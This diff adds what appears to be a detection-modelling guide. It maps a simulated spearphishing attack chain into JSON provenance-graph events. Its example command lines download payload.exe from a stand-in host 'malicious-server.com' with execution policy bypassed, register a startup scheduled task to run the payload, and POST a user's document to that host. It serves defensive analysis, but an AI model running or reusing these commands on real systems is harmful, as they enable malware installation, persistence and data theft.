@@ -1,0 +1,125 @@
+1. **Identify Initial Access via Spearphishing Email**  
+   - Map the event where a user opens a spearphishing email with a malicious attachment.  
+   - Target the `srcNode` as the email client (e.g., Outlook) and the `dstNode` as the attachment (e.g., `Invoice.docx`).  
+   - Set `relation` to "Process Create" for the email client process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+         "Cmdline": "OUTLOOK.EXE",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
+
+2. **Map Document Execution**  
+   - Identify when the user opens the `Invoice.docx` file in Microsoft Word.  
+   - Set `srcNode` to Microsoft Word and `dstNode` to the document.  
+   - Set `relation` to "Process Create".  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+         "Cmdline": "WINWORD.EXE Invoice.docx",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
+
+3. **Capture PowerShell Execution**  
+   - Detect the execution of PowerShell commands triggered by the macro in the document.  
+   - Set `srcNode` to PowerShell and `dstNode` to the command being executed.  
+   - Set `relation` to "Process Create".  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\Victim\\Downloads\\payload.exe'\"",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
+
+4. **Track Payload Execution**  
+   - Identify when the user executes the downloaded `payload.exe`.  
+   - Set `srcNode` to Windows Explorer and `dstNode` to the payload executable.  
+   - Set `relation` to "Process Create".  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\explorer.exe",
+         "Cmdline": "explorer.exe C:\\Users\\Victim\\Downloads\\payload.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
+
+5. **Monitor for Persistence Creation**  
+   - Detect the creation of a scheduled task using PowerShell for persistence.  
+   - Set `srcNode` to PowerShell and `dstNode` to the scheduled task.  
+   - Set `relation` to "Process Create".  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "powershell.exe -Command \"New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\\Users\\Victim\\Downloads\\payload.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Register -TaskName 'MaliciousTask'\"",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "MaliciousTask",
+         "Type": "Registry"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
+
+6. **Detect Data Exfiltration**  
+   - Identify when the payload executes commands to exfiltrate data to an external server.  
+   - Set `srcNode` to PowerShell and `dstNode` to the external server URL.  
+   - Set `relation` to "Process Create".  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/exfiltrate' -Method POST -Body (Get-Content 'C:\\Users\\Victim\\Documents\\sensitive_data.txt')\"",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "http://malicious-server.com/exfiltrate",
+         "Type": "Network"
+       },
+       "relation": "Process Create",
+       "timestamp": <timestamp>
+     }
+     ```
